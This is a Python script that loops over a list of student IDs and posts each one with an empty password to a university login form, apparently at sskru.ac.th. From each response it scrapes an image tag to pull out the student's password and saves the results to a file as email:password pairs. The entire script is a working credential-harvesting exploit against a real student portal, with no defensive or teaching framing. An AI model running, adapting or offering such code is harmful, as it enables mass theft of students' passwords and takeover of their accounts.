import requests, time, os
from bs4 import BeautifulSoup

R = '\033[31;1m'  # red
G = '\033[32;1m'  # green

def main():
    url = "" # url target
    with requests.session() as session:
        with open('std_id.txt',"r") as f:
            std_id = f.readlines()  
        std_id_list = [line[:-1] for line in std_id]
        n = 0
        for student_id in std_id_list:            
            # set payloads     
            payload = {
                'idno' : student_id,
                'idpass' : "",
                'page': 1,
                'Submit' : '++%E0%B9%80%E0%B8%82%E0%B9%89%E0%B8%B2%E0%B8%AA%E0%B8%B9%E0%B9%88%E0%B8%A3%E0%B8%B0%E0%B8%9A%E0%B8%9A++'
            }              
            response = session.post(url, data=payload)
            if response.status_code == 200:
                try:
                    soup = BeautifulSoup(response.text,'html.parser')
                    find_tag = soup.find_all("img")[1]
                    str_data = str(find_tag).split(" ")
                    std_pass = str_data[3][35:-5:]      
                    n += 1
                    with open("data.txt","a") as f:
                        f.write(f'stu{student_id}@sskru.ac.th:{std_pass}\n')
                        print(f"{G}===== {student_id} Successful. Count({n}) =====")
                        time.sleep(1)
                except IndexError:
                    print(f"{R}===== {student_id} failed. =====")
            
if __name__ == '__main__':
    main()
